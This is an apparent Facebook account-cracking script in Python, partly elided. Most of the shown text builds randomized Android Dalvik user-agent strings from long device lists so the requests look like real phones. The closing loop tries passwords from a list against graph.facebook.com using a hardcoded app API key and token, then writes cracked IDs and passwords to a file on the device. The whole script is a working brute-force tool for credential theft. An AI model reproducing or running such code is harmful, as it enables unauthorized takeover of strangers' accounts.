...
def random_dalvik_all_devices_super_working_2025(seed=None):
    ...
    # ---- SAFE Generic App Info ----
    APP_NAME = random.choice([
        "AndroidClient","MobileRuntime","NetEngine","ServiceCore",
        "WebMobile","ClientSDK","CoreModule","DeviceService"
    ])
    APP_VER = f"{random.randint(1,12)}.{random.randint(0,9)}.{random.randint(0,99)}"

    # ---- ALL WORKING DEVICES (2024-2025) ----
    devices = [

        # === Samsung (Most accepted worldwide — weighted heavily) ===
        *[( "Samsung", m ) for m in [
            ...
            "Galaxy M12","Galaxy M21","Galaxy M32","Galaxy M33",
            "Galaxy M34","Galaxy M54",
            "Galaxy S20","Galaxy S20 FE",
            "Galaxy S21","Galaxy S21 FE",
            "Galaxy S22","Galaxy S23","Galaxy S23 Ultra",
            "Galaxy S24","Galaxy S24+","Galaxy S24 Ultra"
        ]] * 4,   # weighted (Samsung = best acceptance)
        ...
        *[( "Xiaomi", m ) for m in [
            ...
            "Poco M4 Pro","Poco X4 Pro","Poco X5 Pro",
            "Poco X6","Poco X6 Pro","Poco F5","Poco F6"
        ]],

        # === Realme ===
        *[( "Realme", m ) for m in [
            "Realme C25","Realme C30","Realme C33","Realme C53","Realme C55",
            "Realme Narzo 50","Realme Narzo 60",
            "Realme 9 Pro","Realme 10 Pro","Realme 11 Pro"
        ]],

        # === Vivo ===
        *[( "Vivo", m ) for m in [
            "Vivo Y15","Vivo Y21","Vivo Y22","Vivo Y33s","Vivo Y36",
            "Vivo V23","Vivo V25","Vivo V27e","Vivo V29"
        ]],

        # === Oppo ===
        *[( "Oppo", m ) for m in [
            "Oppo A16","Oppo A53","Oppo A57",
            "Oppo A78","Oppo F17","Oppo F19 Pro","Oppo F21 Pro",
            "Oppo Reno 8"
        ]],
        ...
        *[( "Infinix", m ) for m in [
            ...
            "Infinix Hot 12","Infinix Hot 30","Infinix Hot 40",
        ...
        *[( "Tecno", m ) for m in [
            ...
            "Tecno Pova 4","Tecno Pova 5","Tecno Camon 20"
        ]],

        # === Google Pixel ===
        *[( "Google", m ) for m in [
            "Pixel 5","Pixel 5a","Pixel 6","Pixel 6a",
            "Pixel 7","Pixel 7a","Pixel 8","Pixel 8a","Pixel 9"
        ]],

        # === Motorola ===
        *[( "Motorola", m ) for m in [
            "Moto G31","Moto G32","Moto G52","Moto G72","Moto Edge 20"
        ]],

        # === OnePlus ===
        *[( "OnePlus", m ) for m in [
            "OnePlus Nord N20","OnePlus Nord CE 2","OnePlus Nord 3",
            "OnePlus 8T","OnePlus 9R","OnePlus 10R"
        ]],

        # === Nokia ===
        *[( "Nokia", m ) for m in [
            "Nokia G10","Nokia G20","Nokia G21","Nokia X20"
        ]]
    ]

    brand, model = random.choice(devices)

    # ---- Best working Android versions ----
    ...
    # ---- Real, accepted build fingerprints ----
    build = random.choice([
        "UP1A.240205.002",
        "UP1A.231005.007",
        "UQ1A.240105.006",
    ...
    # ---- Locales working most ----
    locale = random.choice(["en_US","en_GB","bn_BD","en_IN"])

    # ---- Final UA ----
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build}) "
        f"[APP/{APP_NAME};VER/{APP_VER};"
        f"DM={{density={density},width={width},height={height}}};"
        f"LOCALE/{locale};MODEL/{model};BRAND/{brand}]"
    )
...
def random_dalvik_safe_super_working_2025(seed=None):
    if seed is not None:
        random.seed(seed)

    # ---- Generic App Info (SAFE) ----
    APP_NAME = random.choice([
        "AndroidClient", "MobileRuntime", "WebService", "TestMobile",
        "CoreEngine", "NetHandler", "ClientSDK", "ServiceCore"
    ])
    APP_VER = f"{random.randint(1,12)}.{random.randint(0,9)}.{random.randint(0,99)}"
    ...
    devices = [
        ...
        # Samsung (weighted most)
        *[( "Samsung", m ) for m in [
            "Galaxy A03","Galaxy A04","Galaxy A05","Galaxy A12","Galaxy A13","Galaxy A14",
            "Galaxy A15","Galaxy A23","Galaxy A24","Galaxy A25","Galaxy A33","Galaxy A34",
            "Galaxy A35","Galaxy A53","Galaxy A54","Galaxy A55",
            "Galaxy M12","Galaxy M21","Galaxy M32","Galaxy M33","Galaxy M34","Galaxy M54",
            "Galaxy S20","Galaxy S20 FE","Galaxy S21","Galaxy S21 FE",
            "Galaxy S22","Galaxy S23","Galaxy S23 Ultra","Galaxy S24","Galaxy S24+","Galaxy S24 Ultra"
        ]],
        ...
        *[( "Xiaomi", m ) for m in [
            ...
            "Poco M4 Pro","Poco X4 Pro","Poco X5 Pro","Poco X6","Poco F5","Poco F6"
        ]],

        # Realme
        *[( "Realme", m ) for m in [
            "Realme C25","Realme C33","Realme C53","Realme C55",
            "Realme 9 Pro","Realme 10 Pro","Realme 11 Pro","Realme GT Neo 3"
        ]],

        # Vivo
        *[( "Vivo", m ) for m in [
            "Vivo Y21","Vivo Y22","Vivo Y33s","Vivo Y36",
            "Vivo V23","Vivo V25","Vivo V27e","Vivo V29"
        ]],

        # Oppo
        *[( "Oppo", m ) for m in [
            "Oppo A16","Oppo A53","Oppo A57","Oppo A78",
            "Oppo F19 Pro","Oppo F21 Pro","Oppo Reno 8"
        ]],
        ...
        *[( "Infinix", m ) for m in [
        ...
        # Tecno
        *[( "Tecno", m ) for m in [
            "Tecno Spark 10","Tecno Spark 20","Tecno Pova 5","Tecno Camon 20"
        ]],
        ...
        *[( "Google", m ) for m in [
        ...
        # Motorola
        *[( "Motorola", m ) for m in [
            "Moto G32","Moto G52","Moto G72","Moto Edge 20"
        ]],

        # OnePlus
        *[( "OnePlus", m ) for m in [
            "OnePlus Nord CE 2","OnePlus Nord N20",
            "OnePlus 9R","OnePlus 10R"
        ]]
    ]

    brand, model = random.choice(devices)

    # ---- Android versions working best right now ----
    android_version = random.choice(["10","11","12","13","14"])
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 10.5
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_safe_super_working_2025(),
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_super_working_2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-20-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
